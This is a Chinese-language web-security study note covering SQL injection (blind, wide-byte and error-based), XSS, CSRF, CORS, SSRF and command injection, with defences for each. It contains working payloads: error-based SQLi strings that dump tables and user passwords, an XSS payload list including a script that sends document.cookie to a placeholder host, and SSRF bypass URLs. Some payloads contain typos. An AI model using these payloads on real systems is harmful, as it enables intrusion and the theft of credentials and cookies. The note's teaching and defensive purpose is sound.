+<p><strong>总体思路</strong><br><strong>获取数据库的总数</strong><br><strong>获取别的数据库长度</strong><br> <strong>获取别的数据库名字</strong><br>  <strong>获取当前数据库长度</strong><br>  <strong>获取当前数据库内容</strong><br>  <strong>获取当前数据库表的总数</strong><br>  <strong>获取当前数据库表的长度</strong><br>  <strong>获取当前数据库表的内容</strong><br>  <strong>获取当前数据库表的字段总数</strong><br>  <strong>获取当前数据库表的字段第2个长度</strong><br>  <strong>获取当前数据库表的字段第N个内容</strong><br>  <strong>获取内容</strong></p>
+</blockquote>
+<h4 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h4><p><strong>常用判断</strong><br><code>if(ascii(substr(“payload”, 1, 1))=104, sleep(5), 1)</code> 如果第一个，号前的语句成立，则页面返回 速度慢5秒，不成立，页面立即返回</p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><ol>
+<li>宽字节注入是利用mysql的一个特性，mysql在 使用GBK编码的时候，会认为两个字符是一个汉 字（前一个ASCII码要大于128，才到汉字的范 围）</li>
+</ol>
+<ol start="2">
+<li>PHP中编码为GBK，函数执行添加的是ASCII编 码（添加的符号为“\”），MYSQL默认字符集是 GBK等宽字节字符集。如上图所示%df’被PHP转 义，单引号被加上反斜杠\，变成了%d’，其中\ 的十六进制是%5C，那么现在%d’=%d%5C%27, 如果程序的默认字符集是GBK等宽字节字符集， 则MYSQL用GBK编码时，会认为%df%5C是一个 宽字符，也就是縗，也就是说：%df\’ = %df% 5c%27=縗’，有了单引号就可以注入了。</li>
+<li>GB2312、GBK、GB18030、BIG5、Shift_JIS等 这些都是常说的宽字节，实际上只有两字节<pre><code>宽字节带来的安全问题主要是吃ASCII字符(一字 节)的现象，即将两个ascii字符误认为是一个宽字 节字符。</code></pre></li>
+<li>宽子节注入只有在，服务器页面代码中使用了 gbk编码等汉字编码方式时才有效。</li>
+<li>通常，当页面源代码中使用了 addslashes( )函 数对用户输入的参数进行过滤，并且使用的是字 符串查询的方式时。</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">addslashes() 函数 </span><br><span class="line">函数返回在预定义字符之前添加反斜杠的字符串 </span><br><span class="line">预定义字符： </span><br><span class="line">单引号(<span class="string">') </span></span><br><span class="line"><span class="string">双引号" </span></span><br><span class="line"><span class="string">反斜杠\</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="url转码"><a href="#url转码" class="headerlink" title="url转码"></a>url转码</h4><p> ’ ——&gt; %27<br> 空格 ——&gt; %20<br> #符号 ——&gt; %23<br> \ ——&gt; %5C</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="定义和原理"><a href="#定义和原理" class="headerlink" title="定义和原理"></a>定义和原理</h4><p>SQL报错注入基于报错的信息获取，虽然数据库 报错了，当我们已经获取到我们想要的数据。例 如在增加删除修改处尝试(insert/update/ delete)。</p>
+<h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><p>后台没有屏蔽数据库报错信息，在语法发生错误 的时候会输出在前端。</p>
+<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><ol>
+<li><p><code>updatexml()：</code>是mysql对xml文档数据进行查询 和修改的xpath函数<br><code>&#39; or updatexml(0,concat(0x7e,select database()),1)&#39;</code></p>
+</li>
+<li><p><code>extractvalue()：</code>是mysql对xml文档数据进行查 询的xpath函数<br><code>&#39; or extracrvalue(0,concat(0x7e,database())) or &#39;</code></p>
+</li>
+<li><p><code>floor()</code><br>floor是mysql的一个取整函数<br>payload:<br><code>Select count(*),concat(**PAYLOAD**, floor(rand(0)*2))**x** from 表名 group by **x**;</code><br>爆库:<br><code>&#39; and (select 2 from (select count(*), concat(database(),floor(rand(0)*2)) x from information_schema.tables group by x) a) and &#39;</code><br>爆表<br><code>&#39; and (select 2 from (select count(*), concat((select table_name from information_ schema.tables where table_schema=&#39; pikachu&#39; limit 3,1),floor(rand(0)*2)) x from information_schema.tables group by x) a) and &#39;</code><br>爆列<br><code>&#39; and (select 2 from (select count(*), concat((select column_name from information_schema.columns where table_ name=&#39;users&#39; limit 1,1),floor(rand(0)*2)) x from information_schema.tables group by x) a) and &#39;</code><br>爆内容<br><code>&#39; and (select 2 from (select count(*), concat((select concat(&#39;:&#39;,username, password) from users limit 0,1),floor(rand(0)* 2)) x from information_schema.tables group by x) a)and &#39;</code></p>
+</li>
+<li><p><code>exp</code>函数 当传递一个大于709的值时，函数exp()就会引起 一个溢出错误。<br><code>&#39; or EXP(~(SELECT * from(select version())a)) or &#39;</code><br>爆表<br><code>&#39; or exp(~(select * from(select group_ concat(table_name) from information_ schema.tables where table_schema = &#39; pikachu&#39;)a)) or &#39;</code><br>爆列<br><code>&#39; or exp(~(select * from(select group_ concat(column_name) from information_ schema.columns where table_name = &#39;users&#39;) a)) or &#39;</code><br>爆数据<br><code>&#39; or wzp(~(select * from(select password from users limit 0,1)a)) or &#39;</code></p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3></li>
+<li><p>对用户输入的内容进行转义（PHP中 addslashes()、mysql_real_escape()函数）。</p>
+</li>
+<li><p>限制关键字的输入（PHP中preg_replace()函数 正则替换关键字），限制输入的长度 。</p>
+</li>
+<li><p>使用SQL语句预处理，对SQL语句首先进行预编 译，然后进行参数绑定，最后传入参数。</p>
+<h3 id="网络层面"><a href="#网络层面" class="headerlink" title="网络层面"></a>网络层面</h3><p>部署防火墙</p>
+<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3></li>
+<li><p>定制黑名单：将常用的SQL注入字符写入到黑 名单中，然后通过程序对用户提交的POST、 GET请求以及请求中的各个字段都进行过滤检 查，筛选威胁字符。</p>
+</li>
+<li><p>限制查询长度：由于SQL注入过程中需要构造 较长的SQL语句，因此，一些特定的程序可以使 用限制用户提交的请求内容的长度来达到防御 SQL注入的目的，但这种效果并不好。</p>
+</li>
+<li><p>限制查询类型：限制用户请求内容中每个字段 的类型，并在用户提交请求的时候进行检查，凡 不符合该类型的提交就认为是非法请求。</p>
+</li>
+<li><p>白名单法：该方法只对部分程序有效，对一些 请求内容相对固定的程序，可以制定请求内容的 白名单，如：某程序接受的请求只有数字，且数 字为1至100，这样可以检查程序接受的请求内容 是否匹配，如果不匹配，则认为是非法请求。</p>
+</li>
+<li><p>设置数据库权限：根据程序要求为特定的表设 置特定的权限，如：某段程序对某表只需具备 select权限即可，这样即使程序存在问题，恶意 用户也无法对表进行update或insert等写入操 作。</p>
+</li>
+<li><p>限制目录权限：WEB目录应至少遵循“可写目 录不可执行，可执行目录不可写”的原则，在次基 础上，对各目录进行必要的权限细化。</p>
+<p>较安全的WEB站点应根据程序本身的功能实现， 利用上面的某几种或全部方法，方可达到安全的 目的。</p>
+</li>
+</ol>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><h3 id="原理简介"><a href="#原理简介" class="headerlink" title="原理简介"></a>原理简介</h3><p><strong>跨站脚本攻击—XSS（Cross Site Script），是 指攻击者通过在Web页面中写入恶意脚本，造成 用户在浏览页面时，控制用户浏览器进行操作的 攻击方式。</strong><br>假设，在一个服务端上，有一处功能使用了这段 代码，他的功能是将用户输入的内容输出到页面 上，很常见的一个功能。但是假如，这里输入的 内容是一段经过构造的js。那么在用户再次访问 这个页面时，就会获取使用js在用户的浏览器端 执行一个弹窗操作。通过构造其他相应的代码， 攻击者可以执行更具危害的操作。</p>
+<h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>非持久型，常见的就是在URL中构造，将恶意链 接发送给目标用户。当用户访问该链接时候，会 向服务器发起一个GET请求来提交带有恶意代码 的链接。造成反弹型XSS。<br>主要是GET类型</p>
+<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>持久型，常见的就是在博客留言板、反馈投诉、 论坛评论、将恶意代码和正文都存入服务器的数 据库。每次访问都会触发恶意代码。<br>例如：<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
+<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p><strong>DOM型式特殊的反射型xss</strong><br>在网站页面中有许多页面的元素，当页面到达浏 览器时浏览器会为页面创建一个顶级的 Document object文档对象，接着生成各个子文 档对象，每个页面元素对应一个文档对象，每个 文档对象包含属性、方法和事件。可以通过JS脚 本对文档对象进行编辑从而修改页面的元素。也 就是说，客户端的脚本程序可以通过DOM来动态 修改页面内容，从客户端获取DOM中的数据并在 本地执行。基于这个特性，就可以利用JS脚本来 实现XSS漏洞的利用。<br><code>&lt;script&gt;var img=document.createElement(&quot; img&quot;);img.src=&quot;http://xxxx/a?&quot;+escape( document.cookie);&lt;/script&gt;</code></p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul>
+<li>盗取管理员cookie：盗取管理员的cookie然后登 陆后台，获取到后台权限</li>
+<li>XSS蠕虫攻击：可以构成几何的速度进行传播xss 代码，获取大部分人的权限。一般配合csrf使用</li>
+<li>钓鱼攻击<h2 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h2><code>&lt;script&gt;alert(/xss/);&lt;/script&gt;</code>//经典语句<br><code>&lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt;</code><br><code>&lt;img src=x onerror=alert(1)&gt;</code><br><code>&lt;svg onload=alert(1)&gt;</code><br><code>&lt;a href = javasript:alert(1)&gt;</code><br><code>&lt;img src=1 alert(1)&gt;</code> （显示1） <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> (显 示cookie）<br><code>&lt;script&gt;window.location=&quot;（你的黑页地 址）&quot;;&lt;/script&gt;</code><br><code>&lt;img src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</code><br><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt; &quot;+alert(&#39;XSS&#39;)+&quot; &#39;&gt;</code><br><code>&lt;script src=&quot;http://xss.io/a.js&quot;&gt;&lt;/script&gt;</code><br><code>&lt;div onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;</code><br><code>&lt;div onmouseenter=&quot;alert(&#39;xss&#39;)&quot;&gt;</code><br><code>&quot;onclick=&quot;alert(document.cookie)</code></li>
+</ul>
+<p><strong>绕过</strong><br>可进行fuzz<br>编码<br>大小写</p>
+<h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><ul>
+<li>过滤输入的数据，和非法字符‘ “ &lt; &gt; on* 等”’</li>
+<li>输出到页面的数据进行相应的编码转换包括 HTML实体编码、JavaScript编码等</li>
+<li>无敌防御方法：使用htmlspecialchars函数对输 入的数据实例化，失去本身作用。<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2></li>
+</ul>
+<p><strong>攻击者盗用了用户的身份，以用户的名义发送恶 意请求，对服务器来说这个请求是完全合法的， 但是却完成了攻击者所期望的一个操作</strong></p>
+<ol>
+<li>用户C打开浏览器，访问受信任网站A，输入用 户名和密码请求登录网站A；</li>
+<li>.在用户信息通过验证后，网站A产生Cookie信 息并返回给浏览器，此时用户登录网站A成功， 可以正常发送请求到网站A；</li>
+<li>用户未退出网站A之前，在同一浏览器中，打 开一个TAB页访问网站B；</li>
+<li>网站B接收到用户请求后，返回一些攻击性代 码，并发出一个请求要求访问第三方站点A；</li>
+<li>浏览器在接收到这些攻击性代码后，根据网站 B的请求，在用户不知情的情况下携带Cookie信 息，向网站A发出请求。网站A并不知道该请求其 实是由B发起的，所以会根据用户C的Cookie信 息以C的权限处理该请求，导致来自网站B的恶意 代码被执行。<h2 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h2></li>
+<li>伪造链接诱导用户点击</li>
+<li>伪造站点诱导诱用户点击</li>
+<li>最好配合XSS使用<h3 id="jsonp和cors跨域"><a href="#jsonp和cors跨域" class="headerlink" title="jsonp和cors跨域"></a>jsonp和cors跨域</h3></li>
+</ol>
+<p><strong>简称读取型的CSRF也是需要别人点击</strong></p>
+<h4 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h4><ul>
+<li>JSONP（JSON with padding），是一种利用 HTML中<script></script>元素标签，远程调用 json文件来实现数据传递的技术，它的特点是可 以跨域读取数据。 那么为什么需要用到JSONP这样一种方式传递不 同域之间的数据呢？因为同源策略，同源策略是 由Netscape提出的一个著名的安全策略，现在 所有支持JavaScript的浏览器都会使用这个策 略。</li>
+<li>callback的值是可以动态输出的，如果我们现在 拿到了一个以jsonp方式传输用户认证后数据的 网站，我们就可以构造出一个恶意的jsonp调用 页面，然后诱使用户访问我们的页面，从而达到 一个截取用户信息的目的<h4 id="cors跨域"><a href="#cors跨域" class="headerlink" title="cors跨域"></a>cors跨域</h4>CORS（Cross-Origin Resource Sharing 跨来源资源共享）,CORS允许浏览器向跨域服务器发 出XmlHttpRequest请求，CORS与JSONP的区 别：是JSONP的升级版，JSONP只能通过get方 式请求，CORS支持get和post请求。 CORS跨域原理：向header中注入Access- Control-Allow-Origin服务端过判断请求头中的 参数是否被允许的域来决定请求源是否有权限获 取数据。</li>
+</ul>
+<p><strong>判断cors漏洞</strong><br>最好的攻击案例： Access-Control-Allow-Origin: https:// attacker.com Access-Control-Allow-Credentials: true<br>可能存在利用点： Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true<br> 配置失误，但是几乎无法利用： Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true<br> 或者只有一个： Access-Control-Allow-Origin: *</p>
+<h2 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h2><ul>
+<li>添加验证码：CSRF攻击的过程，往往是在用户 不知情的情况下构造网络请求。所以如果使用验 证码，那么每次操作都需要用户进行互动，从而 简单有效的防御了CSRF攻击。但是如果你在一 个网站作出任何举动都要输入验证码会严重影响 用户体验，所以验证码一般只出现在特殊操作里 面，或者在注册时候使用。然而当今猥琐流代表 pkav祭出了一款web-fuzz测试工具可以绕过普 通的验证码。慎用！</li>
+<li>验证referer：根据HTTP协议，在HTTP头中有 一个字段叫Referer，它记录了该HTTP请求的来 源地址。在通常情况下，访问一个安全受限页面 的请求必须来自于同一个网站。比如某银行的转 账是通过用户访问<a href="http://bank.test/test?page=10&amp;userID=101&amp;money=10000页面完" target="_blank" rel="noopener">http://bank.test/test?page=10&amp;userID=101&amp;money=10000页面完</a> 成，用户必须先登录bank. test，然后通过点击 页面上的按钮来触发转账事件。当用户提交请求 时，该转账请求的Referer值就会是转账按钮所 在页面的URL（本例中，通常是以bank. test域 名开头的地址）。而如果攻击者要对银行网站实 施CSRF攻击，他只能在自己的网站构造请求， 当用户通过攻击者的网站发送请求到银行时，该 请求的Referer是指向攻击者的网站。因此，要 防御CSRF攻击，银行网站只需要对于每一个转 账请求验证其Referer值，如果是以bank. test开 头的域名，则说明该请求是来自银行网站自己的 请求，是合法的。如果Referer是其他网站的 话，就有可能是CSRF攻击，则拒绝该请求。</li>
+<li>使用一次性token：所谓token是一段字母数字随 机值，我们可以把它理解为一个服务端帮我们填 好的验证码！每当我们访问该页面时，服务端会 根据时间戳、用户ID、随机串等因子生成一个随 机的token值并传回到前端的表单中，当我们提 交表单时，token会作为一个参数提交到服务端 进行验证。在这个请求过程中，token的值也是 攻击者无法预知的，而且由于同源策略的限制， 攻击者也无法使用JavaScript获取其他域的 token值，所以这种方法可以成功防御CSRF攻 击，也是现在用的最多的防御方式。但是，需要 注意的一点是，token的生成一定要随机，即不 能被攻击者预测到，否则这种防御将形同虚设。 另外，token如果作为GET请求的参数在url中显 示的话，很容易在Referer中泄露。还有更重要 的一点：如果在同域下存在XSS漏洞，那么基于 token的CSRF防御将很容易被击破。</li>
+<li>限制Session生命周期：顾名思义，缩短Session 的有效时间。<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2></li>
+<li>SSRF(Server-Side Request Forgery:服务器端 请求伪造) 是一种由攻击者构造形成由服务端发 起请求的一个安全漏洞。一般情况下，SSRF攻 击的目标是从外网无法访问的内部系统。（正是 因为它是由服务端发起的，所以它能够请求到与 它相连而与外网隔离的内部系统）</li>
+<li>SSRF 形成的原因大都是由于服务端提供了从其 他服务器应用获取数据的功能且没有对目标地址 做过滤与限制。比如从指定URL地址获取网页文 本内容，加载指定地址的图片，下载等等。</li>
+</ul>
+<p>注释：除了http/https等方式可以造成ssrf，类 似tcp connect 方式也可以探测内网一些ip 的端 口是否开发服务，只不过危害比较小而已。</p>
+<h2 id="可能出现的地方"><a href="#可能出现的地方" class="headerlink" title="可能出现的地方"></a>可能出现的地方</h2><ol>
+<li>分享：通过URL地址分享网页内容</li>
+<li>转码服务</li>
+<li>在线翻译(通过URL地址翻译对应文本的内容。 提供此功能的国内公司有百度、有道等)</li>
+<li>图片加载与下载：<br>通过URL地址加载或下载图 片图片加载远程图片地址此功能用到的地方很多， 但大多都是比较隐秘，比如在有些公司中的加载 自家图片服务器上的图片用于展示。（此处可能 会有人有疑问，为什么加载图片服务器上的图片 也会有问题，直接使用img标签不就好了？ ，没 错是这样，但是开发者为了有更好的用户体验通 常对图片做些微小调整例如加水印、压缩等，所 以就可能造成SSRF问题）</li>
+<li>图片、文章收藏功能<br>此处的图片、文章收藏中的文章收藏就类似于功 能一、分享功能中获取URL地址中title以及文本 的内容作为显示，目的还是为了更好的用户体 验，而图片收藏就类似于功能四、图片加载。</li>
+<li>未公开的api实现以及其他调用URL的功能</li>
+<li>从URL关键字中寻找<h2 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h2></li>
+<li>扫内网</li>
+<li>向内部任意主机的任意端口发送精心构造的 payload</li>
+<li>DOS攻击（请求大文件，始终保持连接Keep- Alive Always）</li>
+<li>攻击内网的web应用，主要是使用GET参数就可 以实现的攻击（比如struts2，sqli等）</li>
+<li>利用file协议读取本地文件等<h2 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h2><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><strong>1、排除法：浏览器f12查看源代码看是否是在本地 进行了请求</strong><br>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在</a> SSRF漏洞<br><strong>2、dnslog等工具进行测试，看是否被访问</strong><br>可以在盲打后台用例中将当前准备请求的uri 和 参数编码成base64，这样盲打后台解码后就知 道是哪台机器哪个cgi触发的请求。<br><strong>3、抓包分析发送的请求是不是由服务器的发送 的，如果不是客户端发出的请求，则有可能是， 接着找存在HTTP服务的内网地址</strong><br>从漏洞平台中的历史漏洞寻找泄漏的存在web应 用内网地址<br>通过二级域名暴力猜解工具模糊猜测内网地址<br><strong>4、直接返回的Banner、title、content等信息</strong><br><strong>5、留意bool型SSRF</strong><h3 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h3><strong>技巧</strong><ol>
+<li>让服务端去访问相应的网址</li>
+<li>让服务端去访问自己所处内网的一些指纹文件 来判断是否存在相应的cms</li>
+<li>可以使用file、dict、gopher[11]、ftp协议进行 请求访问相应的文件</li>
+<li>攻击内网web应用（可以向内部任意主机的任 意端口发送精心构造的数据包{payload}）</li>
+<li>攻击内网应用程序（利用跨协议通信技术）</li>
+<li>判断内网主机是否存活：方法是访问看是否有 端口开放</li>
+<li>DoS攻击（请求大文件，始终保持连接keep- alive always）</li>
+</ol>
+</li>
+</ol>
+<p><strong>小技巧</strong><br>crontab -l 显示当前计划任务<br>crontab -r 清除当前计划任务<br>端口转发工具 socat<br>在Apache配置文件中写入下面的内容，就可以 将jpg文件当做PHP文件来执行<br>AddType application/x-httpd-php .jpg</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p><strong>1、http基础认证</strong><br><a href="http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的" target="_blank" rel="noopener">http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的</a><br><a href="http://xxx.com@attacker.com" target="_blank" rel="noopener">http://xxx.com@attacker.com</a><br><strong>2、各种IP地址的进制转换</strong><br><strong>3、.URL跳转绕过：<a href="http://www.hackersb.cn/" target="_blank" rel="noopener">http://www.hackersb.cn/</a> redirect.php?url=<a href="http://192.168.0.1/" target="_blank" rel="noopener">http://192.168.0.1/</a></strong><br><strong>4、短网址绕过 <a href="http://t.cn/RwbLKDx" target="_blank" rel="noopener">http://t.cn/RwbLKDx</a></strong><br><strong>5、利用302跳转（xip.io，<a href="http://www.tinyrul.com）" target="_blank" rel="noopener">www.tinyrul.com）</a></strong><br>xip.io来绕过：<a href="http://xxx.192.168.0.1.xip" target="_blank" rel="noopener">http://xxx.192.168.0.1.xip</a>. io/ == 192.168.0.1 (xxx 任意）</p>
+<ul>
+<li><p>指向任意ip的域名：xip.io(37signals开发实现的 定制DNS服务)</p>
+<p>当我们访问xip.io的子域，比如127.0.0.1.xip. io的时候，实际上会被自动重定向到127.0.0.1</p>
+<p>如果利用上面的方法会被检测127.0.0.1的 话，可以利用<a href="http://www.tinyurl.com提供的服务来进" target="_blank" rel="noopener">www.tinyurl.com提供的服务来进</a> 行绕过<br><strong>6、限制了子网段，可以加 :80 端口绕过。http:// tieba.baidu.com/f/commit/share/ openShareApi?url=<a href="http://10.42.7.78:80" target="_blank" rel="noopener">http://10.42.7.78:80</a></strong><br><strong>7、探测内网域名，或者将自己的域名解析到内网 ip</strong><br><strong>8、例如 <a href="http://10.153.138.81/ts.php" target="_blank" rel="noopener">http://10.153.138.81/ts.php</a> , 修复时容 易出现的获取host时以/分割来确定host</strong><br>但这样可以用 <a href="http://abc@10.153.138.81/" target="_blank" rel="noopener">http://abc@10.153.138.81/</a> 绕过<br><strong>9、加上#或?即可</strong></p>
+<h2 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h2><ol>
+<li>禁止跳转</li>
+<li>.过滤返回信息，验证远程服务器对请求的响应 是比较容易的方法。如果web应用是去获取某一 种类型的文件。那么在把返回结果展示给用户之 前先验证返回的信息是否符合标准。</li>
+<li>禁用不需要的协议，仅仅允许http和https请 求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</li>
+<li>设置URL白名单或者限制内网IP（使用 gethostbyname()判断是否为内网IP）</li>
+<li>限制请求的端口为http常用的端口，比如 80、 443、8080、8090</li>
+<li>统一错误信息，避免用户可以根据错误信息来 判断远端服务器的端口状态。</li>
+<li>不用限制302重定向<h1 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2></li>
+</ol>
+</li>
+</ul>
+<p><strong>CSRF 和 XSS 和 XXE 有什么区别，以及修复方 式？</strong></p>
+<ul>
+<li>XSS是跨站脚本攻击，用户提交的数据中可以构 造代码来执行，从而实现窃取用户信息等攻击。 修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校 验、浏览器与Web应用端采用相同的字符编码。</li>
+<li>CSRF是跨站请求伪造攻击，XSS是实现CSRF的 诸多手段中的一种，是由于没有在关键操作执行 时进行是否由用户自愿发起的确认。修复方式： 筛选出需要防范CSRF的页面然后嵌入Token、 再次输入密码、检验Referer</li>
+<li>XXE是XML外部实体注入攻击，XML中可以通过 调用实体来请求本地或者远程内容，和远程文件 保护类似，会引发相关安全问题，例如敏感文件 读取。修复方式：XML解析库在调用时严格禁止 对外部实体的解析。</li>
+</ul>
+<p><strong>CSRF、SSRF和重放攻击有什么区别？</strong></p>
+<ul>
+<li>CSRF是跨站请求伪造攻击，由客户端发起</li>
+<li>SSRF是服务器端请求伪造，由服务器发起</li>
+<li>重放攻击是将截获的数据包进行重放，达到身份 认证等目的<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><a href="https://www.freebuf.com/articles/web/224446.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/224446.html</a><br><a href="https://xz.aliyun.com/t/240" target="_blank" rel="noopener">https://xz.aliyun.com/t/240</a><br><a href="https://xz.aliyun.com/t/1243" target="_blank" rel="noopener">https://xz.aliyun.com/t/1243</a></li>
+</ul>
+<h1 id="命令执行与代码执行"><a href="#命令执行与代码执行" class="headerlink" title="命令执行与代码执行"></a>命令执行与代码执行</h1><h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><p><strong>漏洞成因及原理总结</strong></p>
+<ul>
+<li>漏洞成因：脚本语言优点是简洁，方便，但也伴 随着一些问题，如速度慢，无法解除系统底层， 如果我们开发的应用需要一些除去web的特殊功 能时，就需要调用一些外部程序。</li>
+<li>命令执行漏洞概念：当应用需要调用一些外部程 序去处理内容的情况下，就会用到一些执行系统 命令的函数。如PHP中的system，exec， shell_exec等，当用户可以控制命令执行函数中 的参数时，将可注入恶意系统命令到正常命令 中，造成命令执行攻击。</li>
+</ul>
+<p><strong>命令执行漏洞简介</strong><br>用户通过浏览器提交执行命令，由于服务器端没 有针对执行函数做过滤，导致在没有指定绝对路 径的情况下就执行命令，可能会允许攻击者通过 改变 $PATH 或程序执行环境的其他方面来执行 一个恶意构造的代码</p>
+<p><strong>命令执行 VS 代码执行</strong><br>命令执行漏洞：直接调用操作系统命令<br>代码执行漏洞：靠执行脚本代码调用操作系统命令<br>命令执行和代码执行原理</p>
+<ul>
+<li>命令执行原理：<br>在操作系统中，“&amp;、|、||”都可以作为命令连接符 使用，用户通过浏览器提交执行命令，由于服务 器端没有针对执行函数做过滤，导致在没有指定 绝对路径的情况下就执行命令</li>
+<li>代码执行原理<br>应用有时需要调用一些执行系统命令的函数，如 PHP中的system、exec、shell_exec、 passthru、popen、proc_popen等，当用户能 控制这些函数中的参数时，就可以将恶意系统命 令拼接到正常命令中，从而造成命令执行攻击， 这就是命令执行漏洞。<h2 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3>应用调用执行系统命令的函数<br>将用户输入作为系统命令的参数拼接到了命令 行中没有对用户输入进行过滤或过滤不严<h3 id="命令函数的利用"><a href="#命令函数的利用" class="headerlink" title="命令函数的利用"></a>命令函数的利用</h3></li>
+</ul>
+<p><strong>1、System：system函数可以用来执行一个外部 的应用程序并将相应的执行结果输出，函数原型 如下：</strong><br><code>string system(string command, int&amp;return_ var)</code><br>其中，command是要执行的命令，return_var 存放执行命令的执行后的状态值。<br><strong>2、Exec：exec函数可以用来执行一个外部的应 用程序</strong><br><code>string exec (string command, array&amp;output, int &amp;return_var)</code><br>其中，command是要执行的命令，output是获 得执行命令输出的每一行字符串，return_var存 放执行命令后的状态值。<br><strong>3、Passthru：passthru函数可以用来执行一个 UNIX系统命令并显示原始的输出，当UNIX系统 命令的输出是二进制的数据，并且需要直接返回 值给浏览器时，需要使用passthru函数来替代 system与exec函数。Passthru函数原型如下：</strong><br><code>void passthru (string command, int&amp;return_ var)</code><br>其中，command是要执行的命令，return_var 存放执行命令后的状态值。<br><strong>4、 Shell_exec：执行shell命令并返回输出的字 符串，函数原型如下：</strong><br><code>string shell_exec (string command)</code><br>其中，command是要执行的命令。<br><strong>符号</strong></p>
+<ul>
+<li>command1&amp;command2 两个命令同时执行 </li>
+<li>command1&amp;&amp;command2 只有前面命令执行成 功，后面命令才继续执行 </li>
+<li>command1;command2 不管前面命令执行成功 没有，后面的命令继续执行 </li>
+<li>command1||command2 顺序执行多条命令，当 碰到执行正确的命令后将不执行后面的命令</li>
+<li>command1|command2 将command1的输出 作为command2的输入，并且只打印 Command 2执行的结果<h3 id="经验心得"><a href="#经验心得" class="headerlink" title="经验心得"></a>经验心得</h3>我们通常不会说是去特定挖一个命令执行的漏 洞，因为很多情况下我们都是利用一个第三方组 件存在的事件型漏洞进行渗透测试之后，才意识 到原来这属于命令执行漏洞。</li>
+</ul>
+<p>因此，在挖掘漏洞漏洞前，我们很有必要弄清 楚，我们挖的漏洞究竟属于哪一类。</p>
+<p>命令执行漏洞通常分为以下三种：</p>
+<ol>
+<li>代码层过滤不严 商业应用的一些核心代码封装在二进制文件中， 在web应用中通过system函数来调用： system(“/bin/program –arg $arg”);</li>
+<li>系统的漏洞造成命令注入 bash破壳漏洞(CVE-2014-6271)</li>
+<li>调用的第三方组件存在代码执行漏洞： 如WordPress中用来处理图片的ImageMagick 组件JAVA中的命令执行漏洞(struts2/ ElasticsearchGroovy等) ThinkPHP命令执行<h2 id="危害-2"><a href="#危害-2" class="headerlink" title="危害"></a>危害</h2></li>
+</ol>
+<ul>
+<li><p>继承Web服务程序的权限去执行系统命令或 读 - 写文件 </p>
+</li>
+<li><p>反弹shell </p>
+<ul>
+<li>控制整个网站甚至控制服务器</li>
+</ul>
+</li>
+<li><p>进一步内网渗透</p>
+<h2 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h2><ol>
+<li>尽量少用执行命令的函数或者直接禁用 </li>
+<li>在进入执行命令的函数/方法之前，对参数进行 过滤，对敏感字符进行转义 </li>
+<li>参数的值尽量使用引号包裹，并在拼接前调用 addslashes进行转义 </li>
